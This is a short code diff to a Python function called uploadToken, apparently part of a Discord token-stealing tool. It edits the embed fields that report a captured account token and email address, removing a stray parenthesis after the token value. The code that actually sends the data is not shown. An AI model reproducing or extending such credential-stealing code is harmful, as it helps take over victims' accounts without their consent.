@@ -302,7 +302,7 @@ def uploadToken(token, path):
             "fields": [
                 {
                     "name": "<a:flyingcashmoney:939859721719005245> Token:",
-                    "value": f"`{token}`)"
+                    "value": f"`{token}`"
                 },
                 {
                     "name": "<:b_lovekanji:1003875272862470234> Email:",
